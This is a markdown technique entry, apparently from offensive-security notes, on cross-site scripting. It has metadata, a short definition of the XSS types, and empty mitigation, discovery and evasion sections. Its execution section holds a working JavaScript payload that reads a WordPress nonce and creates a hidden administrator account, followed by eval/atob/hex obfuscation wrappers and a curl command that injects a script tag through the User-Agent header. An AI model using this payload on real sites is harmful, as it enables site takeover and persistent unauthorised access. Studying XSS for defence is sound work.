---
category: technique
subjects:
  - cybersec
full_form: Cross-Site Scripting
acronym: XSS
cwe:
  - 707
  - 74
  - 79
vector: client-side
privileges: unauthenticated
target: browser engine
platform:
  - windows
  - linux
  - macos
  - android
  - ios
intent:
  - data exfiltration
  - code injection
  - content injection
  - persistence
---
## Definition
Cross-Site Scripting is a vulnerability that exploits a website improper input sanitization to dynamically inject content into the page [DOM]{Document Object Model}, therefore reaching [RCE]{Remote Code Evaluation} upon rendering on the user's browser

- **Persistent:** The exploit payload is stored in a database or otherwise cached by a server, so every visitor retrieves that payload and executes it
- **Reflected:** The payload is included in a crafted request or link, only attacking the client that submitted this request
- **DOM-based:** The payload never reach the server, being entirely received and executed by the client

## Mitigation

## Discovery

## Execution
1. Construct the payload

```js
let u="/wp-admin/user-new.php";let r=new XMLHttpRequest();r.open("GET",u,!1);r.send();let n=(/ser" value="([^"]*?)"/g).exec(r.responseText)[1];r=new XMLHttpRequest();r.open("POST",u,1);r.setRequestHeader("Content-Type","application/x-www-form-urlencoded");r.send("action=createuser&_wpnonce_create-user="+n+"&user_login=_USR_&email=tmp@mail.com&pass1=_PWD_&pass2=_PWD_&role=administrator");
```

1. Encode and encapsulate it for delivery

```js
eval(String.fromCharCode("63,6f,6e,73,6f,6c,65,2e,6c,6f,67,28,27,70,61,79,6c,6f,61,64,27,29,3b"));
eval(atob("Y29uc29sZS5sb2coJ3BheWxvYWQnKTs="));
eval("\x63\x6f\x6e\x73\x6f\x6c\x65\x2e\x6c\x6f\x67\x28\x27\x70\x61\x79\x6c\x6f\x61\x64\x27\x29\x3b");
document.head.appendChild(Object.assign(document.createElement("script"),{src:"data:text/javascript;base64,Y29uc29sZS5sb2coJ3BheWxvYWQnKTs="}));
```

1. Inject into the vulnerable parameter

```bash
curl -s URL -A '<script>PAYLOAD</script>'
```

## Evasion

## Relevant Reading
- [T1189 - Drive-by Compromise](https://attack.mitre.org/techniques/T1189)
- [T1190 - Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190)
- [TA0003 - Persistence](https://attack.mitre.org/tactics/TA0003)
- [TA0004 - Privilege Escalation](https://attack.mitre.org/tactics/TA0004)
- [TA0006 - Credential Access](https://attack.mitre.org/tactics/TA0006)
- [TA0009 - Collection](https://attack.mitre.org/tactics/TA0009)
- [M1021 - Restrict Web-Based Content](https://attack.mitre.org/mitigations/M1021)
- [M1038 - Execution Prevention](https://attack.mitre.org/mitigations/M1038)
- [M1048 - Application Isolation and Sandboxing](https://attack.mitre.org/mitigations/M1048)
- [Payload All The Things](https://swisskyrepo.github.io/PayloadsAllTheThings/XSS%20Injection/)
- [EDB-ID 41443](https://www.exploit-db.com/exploits/41443)
